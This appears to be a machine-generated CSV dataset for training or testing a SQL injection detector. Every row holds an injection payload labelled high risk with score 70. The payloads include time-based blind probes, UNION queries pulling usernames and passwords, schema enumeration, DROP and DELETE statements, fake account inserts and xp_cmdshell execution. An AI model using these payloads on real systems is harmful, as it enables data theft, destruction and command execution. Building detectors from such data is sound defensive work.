query,risk,score
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 49kan6,high,70
' OR 1=1; DROP TABLE temp; -- # j5kn1wv,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- cjyhab,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # sh0btny,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- /**/ # p9,high,70
'; SELECT pg_sleep(5); -- -- xz3lkd,high,70
' OR 1=1; DROP TABLE temp; -- /**/ /**/,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- -- r1q6pu,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- /**/ -- b,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- a",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; DELETE FROM users; /**/ LIMIT 1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 8p1lqv0",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 2m5unif,high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 6s6vosq,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 0gfnn5,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
'; DELETE FROM users; /**/ # mdt6klc,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- 3",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- foirdr,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ /**/",high,70
' OR 1=1; DROP TABLE temp; -- -- wwtulf,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users /**/ -- h",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # dwrv3wl,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- /**/ -- 4,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ye6ds5,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # l4lyjf0",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- poqzi9",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # wn,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- qy1l1q,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users -- edorx5",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 2k3e28,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ -- k,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # f4fhu34,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ -- f",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 4pu3eq9",high,70
' OR 1=1; DROP TABLE temp; -- -- ijjjgi,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # hp",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- u5oecq,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- /**/ -- a,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- -- psxrsg,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; DELETE FROM users; /**/ -- h5hgw8,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- rtz0r7,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ -- h",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 5tbb6eg,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 589gjxt,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- l",high,70
"' UNION ALL SELECT username, password FROM users # cubjsbm",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # un1i8os",high,70
'; SELECT pg_sleep(5); -- -- tuhhj1,high,70
'; WAITFOR DELAY '0:0:5'-- # s1neu56,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- zmsxwr",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- eotk1z",high,70
'; DROP PROCEDURE admin_login-- # o39h237,high,70
' OR 1=1; DROP TABLE temp; -- -- 0v45f9,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ -- m,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ku2eph,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- # we4y9zs,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ -- 6,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 4sdvtp8,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- p4177z",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # g780hr0",high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; DELETE FROM users; /**/ # kcr40rb,high,70
'; SELECT pg_sleep(5); -- # 6widxci,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # odp4a2a",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; DELETE FROM users; /**/ /**/ -- f,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ -- k,high,70
'; SELECT pg_sleep(5); -- /**/ # ur,high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; SELECT pg_sleep(5); -- -- b1r25u,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 9lou5ke",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- s35g31,high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 7d7ivcx,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- iq8k7k,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; DROP PROCEDURE admin_login-- /**/ # 8x,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; DELETE FROM users; /**/ -- md7pz5,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- 8ddch8",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- s4qw01,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # o7scwl5,high,70
"' UNION ALL SELECT username, password FROM users /**/ /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- cckavv,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # mt",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
'; DELETE FROM users; /**/ # l8h012d,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # eweovvw,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- u00aqp,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- # hmscd3l,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # pc",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- w",high,70
' OR SLEEP(5) AND '1'='1 /**/ # wt,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- bd6cj0,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # woj3uur",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # o9,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ -- 4",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- bq9e5c",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # xo,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ -- 8",high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # feg9ov1",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ -- w,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
' OR 1=1; DROP TABLE temp; -- /**/ # la,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ /**/",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- # v7zjnw7,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # erairlb",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ -- 1",high,70
' OR 1=1; DROP TABLE temp; -- LIMIT 1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- rnysym",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 5i89aaf",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- d0ug8u",high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; SELECT pg_sleep(5); -- # jg2bqms,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- jf0o5z,high,70
' OR 1=1; DROP TABLE temp; -- # dble4sm,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 4kviqd",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ju,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; DELETE FROM users; /**/ -- c0fh3y,high,70
'; DROP PROCEDURE admin_login-- /**/ # 69,high,70
'; WAITFOR DELAY '0:0:5'-- # umgbkk2,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ -- a,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ -- g",high,70
' OR 1=1; DROP TABLE temp; -- /**/ -- 0,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # fgexgsq,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ -- 1,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # xkwbp10",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- 2",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR SLEEP(5) AND '1'='1 /**/ -- b,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- /**/ /**/,high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # e58kiz1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # obbzglz,high,70
"' UNION ALL SELECT username, password FROM users /**/ # f8",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 4fo2td",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # ixm6yt4",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # 2m",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users -- 5jhrtl",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # my9tqpg,high,70
'; WAITFOR DELAY '0:0:5'-- # en74uto,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # syn7n6u",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- p31ecf,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 4ddmiu,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users -- zan7lk",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ /**/,high,70
'; WAITFOR DELAY '0:0:5'-- -- oo2thh,high,70
' OR SLEEP(5) AND '1'='1 -- ts7juv,high,70
'; DROP PROCEDURE admin_login-- /**/ # lu,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ -- e",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # tfk5yoz",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # ab3qetp",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 08tonr",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- mr4r9i",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- rnlmtl",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- fk03uc,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
'; SELECT pg_sleep(5); -- # int51k0,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
' OR SLEEP(5) AND '1'='1 # ritcf9a,high,70
"' UNION ALL SELECT username, password FROM users -- t2tq7u",high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- -- p5t44y,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- # fr2inxr,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; DELETE FROM users; /**/ /**/ -- o,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 11wni3a,high,70
'; SELECT pg_sleep(5); -- # xwr3k3k,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
'; DELETE FROM users; /**/ /**/ -- w,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- mucmoo",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
'; DELETE FROM users; /**/ # fgf5mfv,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # ftrh38w,high,70
'; DELETE FROM users; /**/ # jt3rjdq,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- zpebqi,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- yr08fk,high,70
' OR SLEEP(5) AND '1'='1 /**/ /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- m2v3js,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ -- 0,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
